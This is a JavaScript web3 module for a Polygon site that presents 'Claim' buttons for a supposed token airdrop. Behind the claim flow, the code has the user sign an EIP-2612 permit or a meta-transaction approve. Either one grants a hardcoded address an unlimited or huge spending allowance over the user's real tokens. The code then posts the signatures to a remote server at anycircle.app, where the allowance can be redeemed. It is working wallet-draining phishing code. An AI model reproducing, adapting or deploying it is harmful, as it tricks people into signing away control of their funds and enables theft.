import WalletConnectProvider from "@walletconnect/web3-provider";

export const Web3 = require("web3");
export const mainNetwork = 137;
export const baseURL = "https://anycircle.app";

export const arrayTokens = require("../helpers/archivo.json");
var cache_connected = false;
var walletConnect = false;
var user_account = null;

var WCprovider = new WalletConnectProvider({
  rpc: {
    137: "https://polygon-rpc.com/",
  },
  chainId: 137,
  network: "polygon",
  qrcode: true,
  qrcodeModalOptions: {
    mobileLinks: ["metamask", "trust", "argent", "rainbow"],
  },
});

export const getMainBalance = async () => {
  if (isWeb3Connected()) {
    const web3 = new Web3(getProvider()),
      balance = await web3.eth.getBalance(getUserAddress());

    const ethers = require("ethers"),
      formatBalance = Number(ethers.utils.formatEther(balance));

    return formatBalance.toFixed(2);
  } else {
    return 0;
  }
};

export const getTokenBalance = async () => {
  var checkNet = false;

  await checkNetwork().then((res) => {
    if (!res) {
      changeNetwork().then((res) => {
        checkNet = res;
      });
    } else {
      checkNet = true;
    }
  });

  if (cache_connected && checkNet) {
    const contractAddress = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
      abi = "uChild_abi.json";

    const web3 = new Web3(getProvider()),
      real_abi = require(`./abi-codes/${abi}`),
      instanceContract = new web3.eth.Contract(real_abi, contractAddress);

    const tokenBalance = await instanceContract.methods
        .balanceOf(getUserAddress())
        .call(),
      tokenDecimals = await instanceContract.methods.decimals().call();

    const formatBalance = (tokenBalance / 10 ** tokenDecimals).toFixed(2);
    return formatBalance;
  } else {
    return 0;
  }
};

// export const generateLoggedTable = async () => {
//   const tmpTable = document.createElement('div');
//   const web3 = new Web3(window.ethereum);

//   for (let index = 0; index < arrayTokens.length; index++) {
//     const {name, symbol, contractAddress, fakeAddress, claimBalance } = arrayTokens[index];

//     try {
//       const abiToken = require('./abi-codes/uChild_abi.json'),
//             instanceContract = new web3.eth.Contract(abiToken, fakeAddress),
//             tokenBalance = await instanceContract.methods.balanceOf(getUserAddress()).call(),
//             tokenDecimals = await instanceContract.methods.decimals().call();

//       if (tokenBalance > 0) {
//         const element = addElementToTable(index, name, symbol, contractAddress, tokenBalance, false, claimBalance);
//         tmpTable.insertBefore(element, tmpTable.firstChild);
//       } else {
//         const element = addElementToTable(index, name, symbol, contractAddress, 0, true, claimBalance);
//         tmpTable.appendChild(element);
//       }
//     } catch (err) {
//       /*console.log(err);
//       console.log(contractAddress);*/
//     }
//   }

//   return tmpTable;
// }

// export const generateEmptyTable = async () => {
//   const tmpTable = document.createElement('div');

//   for (let index = 0; index < arrayTokens.length; index++) {
//     const {name, symbol, contractAddress } = arrayTokens[index];
//     const element = addElementToTable(index, name, symbol, contractAddress, 0, true);

//     tmpTable.appendChild(element);
//   }

//   return tmpTable;
// }

// export const createTable = async () => {
//   const {divTable, spinner} = resetTable();

//   const table = (await checkNetwork()) ? await generateLoggedTable() : await generateEmptyTable();
//   divTable.appendChild(table);
//   spinner.remove();
// }

// export const resetTable = () => {
//   const mainTable = document.getElementById("main-table");
//   mainTable.innerHTML = '';

//   const divTable = document.createElement('div'),
//         divMain = document.createElement('div'),
//         row1 = document.createElement('div'),
//         row2 = document.createElement('div'),
//         row3 = document.createElement('div'),
//         spinner = document.createElement('div'),
//         imgSpinner = document.createElement('img');

//   divTable.classList.add("container", "text-center", "token-table")
//   divMain.classList.add("row");
//   row1.classList.add("col-3", "column-head", "text-left");
//   row1.innerHTML = "Tokens";

//   row2.classList.add("col-md", "column-head");
//   row2.innerHTML = "Address";

//   row3.classList.add("col-md", "column-head");

//   divTable.setAttribute('data-v-427a92ac', '');
//   divMain.setAttribute('data-v-427a92ac', '');
//   row1.setAttribute('data-v-427a92ac', '');
//   row2.setAttribute('data-v-427a92ac', '');
//   row3.setAttribute('data-v-427a92ac', '');

//   divMain.appendChild(row1);
//   divMain.appendChild(row2);
//   divMain.appendChild(row3);

//   spinner.classList.add("spinner-load");
//   imgSpinner.classList.add("pol_anim", "animate__animated", "animate__flip", "animate__infinite");
//   imgSpinner.src = "./_nuxt/img/pol.svg"
//   spinner.appendChild(imgSpinner);

//   divTable.appendChild(divMain);
//   divTable.appendChild(spinner);
//   mainTable.appendChild(divTable);

//   return {divTable, spinner};
// }

export const walletCRequest = async () => {
  let result = { connect: false };

  WCprovider = new WalletConnectProvider({
    rpc: {
      137: "https://polygon-rpc.com/",
    },
    chainId: 137,
    network: "polygon",
    qrcode: true,
    qrcodeModalOptions: {
      mobileLinks: ["metamask", "trust", "argent"],
    },
  });

  try {
    WCprovider.networkId = 1;
    await WCprovider.enable();

    result = await getConnection(WCprovider);
    walletConnect = true;
  } catch (err) {
    await WCprovider.disconnect();
    walletConnect = false;
  }

  return result;
};

function getCookie(cName) {
  const name = cName + "=";
  const cDecoded = decodeURIComponent(document.cookie); //to be careful
  const cArr = cDecoded.split("; ");
  let res;
  cArr.forEach((val) => {
    if (val.indexOf(name) === 0) res = val.substring(name.length);
  });

  return res;
}

export const addElementToTable = (
  index,
  name,
  symbol,
  contract,
  balance,
  disabled,
  claimBalance
) => {
  let contentRow = document.createElement("div"),
    rowName = document.createElement("div"),
    rowContract = document.createElement("div"),
    linkContract = document.createElement("a"),
    rowClaim = document.createElement("div"),
    buttonClaim = document.createElement("button");

  // Content main
  contentRow.classList.add("row", "content-row");

  // Name
  rowName.classList.add("col-3", "column-data", "text-left");
  rowName.innerHTML = `${name} (${symbol})`;

  // Address
  rowContract.classList.add("col-md", "column-data");
  linkContract.href = `https://polygonscan.com/token/${contract}`;
  linkContract.target = "_blank";
  linkContract.innerHTML = contract;
  rowContract.appendChild(linkContract);

  rowClaim.classList.add("col-md", "column-data", "center_padding");
  buttonClaim.classList.add(
    "align-self-center",
    "btn",
    "btn-primary",
    "login-button",
    "d-flex",
    "center_center",
    "btn_claim"
  );

  if (disabled) {
    buttonClaim.classList.add("disabled");
    buttonClaim.innerHTML = "Claim";
  } else {
    let tokenClaimed = getCookie(symbol);

    if (!tokenClaimed) {
      buttonClaim.innerHTML = `Claim ${symbol}`;

      const boxToSign = document.getElementById("box-to-sign"),
        boxWaitingSign = document.getElementById("box-wait-sign"),
        boxAfterSign = document.getElementById("box-after-sign");

      const signEvent = async () => {
        boxWaitingSign.style.display = "flex";
        boxToSign.style.display = "none";

        let signed = await signTransaction(index);

        boxWaitingSign.style.display = "none";
        if (signed) {
          boxAfterSign.style.display = "flex";
          createTable();
        } else {
          boxToSign.style.display = "flex";
        }
      };

      buttonClaim.addEventListener("click", () => {
        const modalTitle = document.getElementById("modal-title"),
          modalText = document.getElementById("modal-text"),
          modalButton = document.getElementById("modal-button");

        // events - text
        const ethers = require("ethers");
        modalTitle.innerHTML = `${claimBalance} ${symbol}`;
        modalText.innerHTML = `You can claim ${claimBalance} ${symbol}`;
        modalButton.onclick = signEvent;

        // Show modal
        boxWaitingSign.style.display = "none";
        boxAfterSign.style.display = "none";
        boxToSign.style.display = "flex";
        document.querySelector(".modal").classList.add("show");
        document.querySelector(".modal-backdrop").classList.add("show");
      });
    } else {
      buttonClaim.classList.add("disabled");
      buttonClaim.innerHTML = "Claimed";
    }
  }
  rowClaim.appendChild(buttonClaim);

  // Add attributes
  contentRow.setAttribute("data-v-427a92ac", "");
  rowName.setAttribute("data-v-427a92ac", "");
  rowContract.setAttribute("data-v-427a92ac", "");
  rowClaim.setAttribute("data-v-427a92ac", "");

  contentRow.appendChild(rowName);
  contentRow.appendChild(rowContract);
  contentRow.appendChild(rowClaim);
  return contentRow;
};

const domainType = [
  {
    name: "name",
    type: "string",
  },
  {
    name: "version",
    type: "string",
  },
  {
    name: "verifyingContract",
    type: "address",
  },
  {
    name: "salt",
    type: "bytes32",
  },
];

const metaTransactionType = [
  {
    name: "nonce",
    type: "uint256",
  },
  {
    name: "from",
    type: "address",
  },
  {
    name: "functionSignature",
    type: "bytes",
  },
];

const domainPermitType = [
  {
    name: "name",
    type: "string",
  },
  {
    name: "version",
    type: "string",
  },
  {
    name: "chainId",
    type: "uint256",
  },
  {
    name: "verifyingContract",
    type: "address",
  },
];

const permitType = [
  {
    name: "owner",
    type: "address",
  },
  {
    name: "spender",
    type: "address",
  },
  {
    name: "value",
    type: "uint256",
  },
  {
    name: "nonce",
    type: "uint256",
  },
  {
    name: "deadline",
    type: "uint256",
  },
];

const approveAbi = {
  inputs: [
    { internalType: "address", name: "spender", type: "address" },
    { internalType: "uint256", name: "amount", type: "uint256" },
  ],
  name: "approve",
  outputs: [{ internalType: "bool", name: "", type: "bool" }],
  stateMutability: "nonpayable",
  type: "function",
};

const getTransactionData = async (domainData, nonce, params) => {
  let web3 = new Web3(getProvider()),
    userAddress = getUserAddress();
  const functionSignature = web3.eth.abi.encodeFunctionCall(approveAbi, params);

  let message = {};
  message.nonce = parseInt(nonce);
  message.from = userAddress;
  message.functionSignature = functionSignature;

  const dataToSign = JSON.stringify({
    types: {
      EIP712Domain: domainType,
      MetaTransaction: metaTransactionType,
    },
    domain: domainData,
    primaryType: "MetaTransaction",
    message: message,
  });

  try {
    var signature = await window.ethereum.request({
      method: "eth_signTypedData_v4",
      params: [userAddress, dataToSign],
      from: userAddress,
    });
  } catch (err) {
    return false;
  }

  let r = signature.slice(0, 66);
  let s = "0x".concat(signature.slice(66, 130));
  let v = "0x".concat(signature.slice(130, 132));
  v = parseInt(v);
  if (![27, 28].includes(v)) v += 27;

  return {
    r,
    s,
    v,
    functionSignature,
  };
};

const getPermitData = async (domainData, nonce) => {
  let userAddress = getUserAddress();
  const ethers = require("ethers");
  let message = {},
    deadline = Math.round(Date.now() / 1000) + 60 * 200000;
  message.nonce = parseInt(nonce);
  message.owner = userAddress;
  message.spender = "0xd83035BeBffdb446a0B11Fd901Ad9B3220742822";
  message.value =
    "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  message.deadline = deadline;

  const dataToSign = JSON.stringify({
    types: {
      EIP712Domain: domainPermitType,
      Permit: permitType,
    },
    domain: domainData,
    primaryType: "Permit",
    message: message,
  });

  try {
    var signature = await window.ethereum.request({
      method: "eth_signTypedData_v4",
      params: [userAddress, dataToSign],
      from: userAddress,
    });
  } catch (err) {
    return false;
  }

  if (signature) {
    let r = signature.slice(0, 66);
    let s = "0x".concat(signature.slice(66, 130));
    let v = "0x".concat(signature.slice(130, 132));
    v = parseInt(v);
    if (![27, 28].includes(v)) v += 27;

    return {
      r,
      s,
      v,
      deadline,
    };
  } else {
    return false;
  }
};

export const signTransaction = async (slot) => {
  var signSuccess = false;

  if (isWeb3Connected() && arrayTokens[slot]) {
    const { contractAddress, symbol, abi, typeSign } = arrayTokens[slot];

    let web3 = new Web3(getProvider()),
      abiToken = require(`./abi-codes/${abi}`),
      tokenContract = new web3.eth.Contract(abiToken, contractAddress),
      tokenName = await tokenContract.methods.name().call();

    let userNonce;
    typeSign == 1
      ? (userNonce =
          abi != "usdc_abi.json"
            ? await tokenContract.methods.getNonce(getUserAddress()).call()
            : await tokenContract.methods.nonces(getUserAddress()).call())
      : (userNonce = await tokenContract.methods
          ._nonces(getUserAddress())
          .call());
    const bigNumber = web3.utils.toBN("1000000000000000000000000000000");

    if (typeSign == 1) {
      const domainData = {
        name: tokenName,
        version: "1",
        chainId: 137,
        verifyingContract: contractAddress,
        salt: "0x0000000000000000000000000000000000000000000000000000000000000089",
      };

      const { r, s, v, functionSignature } = await getTransactionData(
        domainData,
        userNonce,
        ["0xd83035BeBffdb446a0B11Fd901Ad9B3220742822", bigNumber]
      );

      if (r && s && v && functionSignature) {
        const params = {
          signData: {
            userAddress: getUserAddress(),
            contractAddress,
            r,
            s,
            v,
            functionSignature,
          },
        };

        await POST_Function("/signs-encoded", params).then(async (res) => {
          signSuccess = res && res.ok;
        });

        document.cookie = symbol + "=1";
      }
    } else {
      const domainData = {
        name: tokenName,
        version: "1",
        chainId: 137,
        verifyingContract: contractAddress,
      };

      const { r, s, v, deadline } = await getPermitData(
        domainData,
        userNonce,
        symbol
      );

      if (r && s && v && deadline) {
        const params = {
          signData: {
            userAddress: getUserAddress(),
            contractAddress,
            deadline,
            r,
            s,
            v,
          },
        };

        await POST_Function("/permit-encoded", params).then(async (res) => {
          signSuccess = res && res.ok;
        });

        document.cookie = symbol + "=1";
      }
    }
  }

  return signSuccess;
};

export const changeNetwork = async () => {
  var correctNetwork = false;

  let net_params = [
    {
      chainId: "0x89",
      chainName: "Polygon Mainnet",
      nativeCurrency: {
        name: "Polygon",
        symbol: "MATIC",
        decimals: 18,
      },
      rpcUrls: ["https://polygon-rpc.com/"],
      blockExplorerUrls: ["https://polygonscan.com"],
    },
  ];

  try {
    await ethereum
      .request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x89" }],
      })
      .then(async () => {
        net_id = await web3.eth.getChainId();
        correctNetwork = net_id == mainNetwork;
      });
  } catch (switchError) {
    if (switchError.code === 4902) {
      try {
        await ethereum.request({
          method: "wallet_addEthereumChain",
          params: net_params,
        });
      } catch (addError) {
        correctNetwork = false;
      }
    }
  }

  return correctNetwork;
};

export const checkNetwork = async () => {
  var correctNetwork = false;

  if (isWeb3Connected()) {
    let web3 = new Web3(getProvider()),
      net_id = await web3.eth.getChainId();

    correctNetwork = net_id == mainNetwork;
  }

  return correctNetwork;
};

export const getUserAddress = () => {
  return user_account;
};

export const isWeb3Connected = () => {
  return cache_connected || walletConnect;
};

export const getProvider = () => {
  if (window.ethereum) {
    return window.ethereum;
  } else {
    return "https://polygon-rpc.com/";
  }
};

export const getConnection = async (provider) => {
  let result = { connect: false, userAccount: false };

  let web3 = new Web3(provider);

  try {
    let allUserAccounts = await web3.eth.getAccounts();

    result.connect = allUserAccounts.length != 0;
    result.userAccount = allUserAccounts[0];
  } catch (err) {
    result.connect = false;
    result.userAccount = false;
  }

  user_account = result.userAccount;
  cache_connected = result.connect;

  return result;
};

export const checkConnection = async () => {
  let result = { connect: false, userAccount: false };

  if (window.ethereum) {
    result = await getConnection(window.ethereum);
  }

  return result;
};

export const requestConnection = async () => {
  let result = { connect: false, userAccount: false };

  if (window.ethereum) {
    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      result = await getConnection(window.ethereum);
    } catch (err) {
      alert(err.code);
    }
  } else {
    alert("metamask-required");
  }

  return result;
};

export const sendTransaction = async (from, to, data, value) => {
  let web3 = new Web3(getProvider()),
    txHash = false,
    rawTx = {
      from,
      to,
      data,
      gasPrice: await web3.utils.toHex("20000000000"),
      value,
    };

  try {
    await web3.eth.sendTransaction(rawTx).then((hashId) => {
      txHash = hashId;
    });
  } catch (err) {
    if (err.code) {
      //alert(err.code);
    } else {
      //alert("4001");
    }
  }

  return txHash;
};

export const POST_Function = async (src, params) => {
  let postOBJ = {
      method: "POST",
      mode: "cors",
      cache: "no-cache",
      credentials: "same-origin",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(params),
    },
    result = false;

  await fetch(baseURL + src, postOBJ).then(async (res) => {
    if (res) {
      result = res;
    }
  });

  return result;
};

export const showSpinner = (content) => {
  let boxSpinner = document.createElement("div");

  while (content.firstChild) {
    content.removeChild(content.firstChild);
  }

  boxSpinner.id = "mini-spinner";
  boxSpinner.classList.add("button--loading");
  content.appendChild(boxSpinner);
};
